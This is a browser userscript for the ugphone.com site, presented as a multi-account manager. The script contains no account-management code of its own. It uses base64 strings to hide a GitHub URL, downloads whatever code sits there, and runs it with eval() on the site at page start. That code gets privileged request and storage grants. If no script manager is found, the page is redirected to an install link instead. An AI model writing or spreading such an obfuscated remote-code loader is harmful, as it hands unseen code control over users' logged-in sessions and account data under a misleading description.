// ==UserScript==
// @name         Multi-Tab Account Manager for UGPhone
// @namespace    minhbeo8-ugphone
// @version      1.0.7
// @description  Quản lý nhiều local ugphone
// @author       Minhbeo8 (hominz)
// @supportURL   https://discord.gg/XK8qsgrF
// @icon         https://raw.githubusercontent.com/Minhbeo8/extension_multi_Browser/main/hominz.png
// @match        https://www.ugphone.com/*
// @match        https://ugphone.com/*
// @match        https://www.ugphone.com/toc-portal/*
// @match        https://ugphone.com/toc-portal/*
// @grant        GM_xmlhttpRequest
// @grant        GM_info
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @run-at       document-start
// ==/UserScript==

(function(){'use strict';function decodeBase64(e){try{return atob(e)}catch(e){return""}}const sourceUrl=decodeBase64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbmhiZW84L2V4dGVuc2lvbl9tdWx0aV9Ccm93c2VyL21haW4vZXh0ZW5zaW9u");if(typeof GM_info==='undefined'||!GM_info.scriptHandler){location.href=decodeBase64("aHR0cHM6Ly90YW1wZXJtb25rZXkubmV0P2V4dD1kaGRnJnVwZGF0ZWQ9dHJ1ZSN1cmw9aHR0cHMlM0ElMkYlMkZyYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tJTJGTWluaGJlbyU4JTJGMGV4dGVuc2lvbl9tdWx0aV9Ccm93c2VyJTJGbWFpbiUyRm11bHRpLXRhYi1hY2NvdW50LW1hbmFnZXIudXNlci5qcw==");return}GM_xmlhttpRequest({method:'GET',url:sourceUrl,onload:function(e){if(e.status===200&&e.responseText.trim()){eval(e.responseText)}},onerror:function(e){}});})();
